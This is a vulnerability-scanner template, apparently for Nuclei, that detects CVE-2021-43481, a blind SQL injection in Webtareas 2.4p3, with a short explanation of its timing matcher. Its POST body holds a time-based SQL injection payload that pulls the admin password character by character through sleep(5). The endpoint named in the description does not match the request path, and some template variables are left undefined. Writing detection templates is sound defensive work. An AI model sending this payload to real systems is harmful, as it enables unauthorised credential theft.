id: CVE-2021-43481

info:
  name: Blind SQL Injection in Webtareas 2.4p3
  author: ProjectDiscoveryAI
  severity: critical
  description: An SQL Injection vulnerability exists in Webtareas 2.4p3 and earlier via the $uq HTTP POST parameter in editapprovalstage.php.

http:
  - method: POST
    path:
      - "{{BaseURL}}/approvals/editapprovaltemplate.php?id=7"
    body: |
      csrfToken={{csrfToken}}&action=update&cd=Q&uq=SELECT 1 and IF(ascii(substring((SELECT password FROM gW8members WHERE id=1),{{position}},1))={{ascii_value}},sleep(5),0);
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
This template is designed to detect the blind SQL injection vulnerability by sending a crafted POST request that includes a SQL injection payload. The matcher checks if the response time is greater than 5 seconds, indicating that the injected SQL command caused the database to delay the response, confirming the vulnerability.